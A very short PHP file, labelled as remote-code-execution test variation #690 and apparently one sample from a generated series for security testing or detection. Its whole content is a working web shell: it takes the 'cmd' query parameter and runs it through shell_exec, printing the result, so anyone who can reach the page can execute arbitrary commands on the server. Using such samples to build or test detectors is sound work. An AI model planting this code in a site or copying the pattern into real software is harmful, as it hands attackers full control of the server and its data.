<?php
// RCE test variation #690
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>